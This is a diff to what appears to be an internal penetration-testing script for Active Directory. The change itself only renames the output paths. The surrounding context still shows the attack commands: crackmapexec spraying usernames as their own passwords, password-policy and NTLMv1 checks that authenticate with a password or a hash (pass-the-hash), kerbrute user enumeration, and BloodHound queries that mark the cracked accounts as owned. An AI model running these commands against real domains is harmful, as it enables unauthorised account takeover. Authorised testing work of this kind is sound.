@@ -65,7 +65,7 @@ if [ -z "$HASH" ]; then
   # shellcheck disable=SC1003
   awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | grep -v 'HealthMailbox' | sed '/\x1b\[[0-9;]*[mGKHF]/d' >/root/output/list/user.txt
   rm /root/output/list/raw.txt
-  crackmapexec smb "$IP" -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >>/root/output/loot/intern/ad/iam/username/raw_"$DOM".txt 2>&1
+  crackmapexec smb "$IP" -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >>/root/output/loot/intern/ad/iam/user_as_pass/raw_"$DOM".txt 2>&1
 
   echo "kerbrute userenum" >>/root/output/runtime.txt
   date >>/root/output/runtime.txt
@@ -82,7 +82,7 @@ if [ -z "$HASH" ]; then
   date >>/root/output/runtime.txt
   # Password policy
   echo "CME Pass-Pol"
-  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" --pass-pol >>/root/output/loot/intern/ad/passpol/pol_"$DOM".txt 2>&1
+  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" --pass-pol >>/root/output/loot/intern/ad/iam/passpol/pol_"$DOM".txt 2>&1
 
   echo "CME nopac" >>/root/output/runtime.txt
   date >>/root/output/runtime.txt
@@ -118,7 +118,7 @@ if [ -z "$HASH" ]; then
   date >>/root/output/runtime.txt
   # cme ntlmv1 check
   echo "CME ntlmv1 check"
-  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M ntlmv1 >>/root/output/loot/intern/ad/ntlm_auth/ntlmv1_"$DOM".txt 2>&1
+  crackmapexec smb "$IP" -u "$USER" -p "$PASS" -d "$DOM" -M ntlmv1 >>/root/output/loot/intern/ad/iam/ntlm_auth/ntlmv1_"$DOM".txt 2>&1
 
   echo "CME ASRep" >>/root/output/runtime.txt
   date >>/root/output/runtime.txt
@@ -214,7 +214,7 @@ if [ -z "$PASS" ]; then
   # shellcheck disable=SC1003
   awk '/445/ {print$5}' /root/output/list/raw.txt | cut -d '\' -f 2 | grep -v 'HealthMailbox' | sed '/\x1b\[[0-9;]*[mGKHF]/d' >/root/output/list/user.txt
   rm /root/output/list/raw.txt
-  crackmapexec smb "$IP" -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >>/root/output/loot/intern/ad/iam/username/raw_"$DOM".txt 2>&1
+  crackmapexec smb "$IP" -u /root/output/list/user.txt -p /root/output/list/user.txt --no-bruteforce --continue-on-success >>/root/output/loot/intern/ad/iam/user_as_pass/raw_"$DOM".txt 2>&1
 
   echo "kerbrute userenum" >>/root/output/runtime.txt
   date >>/root/output/runtime.txt
@@ -231,7 +231,7 @@ if [ -z "$PASS" ]; then
   date >>/root/output/runtime.txt
   # Password policy
   echo "CME Pass-Pol"
-  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" --pass-pol >>/root/output/loot/intern/ad/passpol/pol_"$DOM".txt 2>&1
+  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" --pass-pol >>/root/output/loot/intern/ad/iam/passpol/pol_"$DOM".txt 2>&1
 
   echo "CME nopac" >>/root/output/runtime.txt
   date >>/root/output/runtime.txt
@@ -267,7 +267,7 @@ if [ -z "$PASS" ]; then
   date >>/root/output/runtime.txt
   # CME ntlmv1 check
   echo "CME ntlmv1 check"
-  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M ntlmv1 >>/root/output/loot/intern/ad/ntlm_auth/ntlmv1_"$DOM".txt 2>&1
+  crackmapexec smb "$IP" -u "$USER" -H "$HASH" -d "$DOM" -M ntlmv1 >>/root/output/loot/intern/ad/iam/ntlm_auth/ntlmv1_"$DOM".txt 2>&1
 
   echo "CME ASRep" >>/root/output/runtime.txt
   date >>/root/output/runtime.txt
@@ -343,13 +343,13 @@ mv ./*.zip /root/output/loot/intern/ad
 awk '/VALID USERNAME/ {print$7}' /root/output/loot/intern/ad/kerberos/user_enum/kerbrute_"$DOM".txt | sed 's/@.*//g' >/root/output/list/user_kerbrute_"$DOM".txt
 
 # BH owned
-grep '+' /root/output/loot/intern/ad/iam/username/raw_"$DOM".txt >/root/output/loot/intern/ad/iam/username/user_"$DOM".txt
+grep '+' /root/output/loot/intern/ad/iam/user_as_pass/raw_"$DOM".txt >/root/output/loot/intern/ad/iam/user_as_pass/user_"$DOM".txt
 # keep the raw file for screens and debugging
 # BH owned User
-awk '/\+/ {print$6}' /root/output/loot/intern/ad/iam/username/user_"$DOM".txt | cut -d : -f 2 | sort -u | tr '[:lower:]' '[:upper:]' >/root/output/loot/intern/ad/iam/username/owneduser.txt
+awk '/\+/ {print$6}' /root/output/loot/intern/ad/iam/user_as_pass/user_"$DOM".txt | cut -d : -f 2 | sort -u | tr '[:lower:]' '[:upper:]' >/root/output/loot/intern/ad/iam/user_as_pass/owneduser.txt
 
-for i in $(cat /root/output/loot/intern/ad/iam/username/owneduser.txt); do
-  echo "MATCH (n) WHERE n.name = '""$i""@""$BHDOM""' SET n.owned=True SET n.UserNameAsPass=True SET n.plaintext=True;" >>/root/output/loot/intern/ad/iam/username/bh_owned.txt
+for i in $(cat /root/output/loot/intern/ad/iam/user_as_pass/owneduser.txt); do
+  echo "MATCH (n) WHERE n.name = '""$i""@""$BHDOM""' SET n.owned=True SET n.UserNameAsPass=True SET n.plaintext=True;" >>/root/output/loot/intern/ad/iam/user_as_pass/bh_owned.txt
 done
 
 # GPP AutoLogin
